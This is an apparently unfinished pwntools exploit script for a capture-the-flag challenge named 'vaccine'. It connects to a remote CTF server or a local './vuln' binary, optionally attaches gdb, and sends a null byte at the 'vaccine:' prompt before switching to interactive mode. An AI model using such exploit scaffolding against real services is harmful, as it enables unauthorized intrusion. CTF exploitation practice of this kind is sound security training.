from pwn import * 
from pwn import p64


debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./vuln")
else:
    host = "vaccine.chal.ctf.acsc.asia"
    r = connect(host,1337)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r,'*b 0x4012ed')
    pause()
    pass

r.sendlineafter(b'vaccine:',b'\0')


r.interactive()
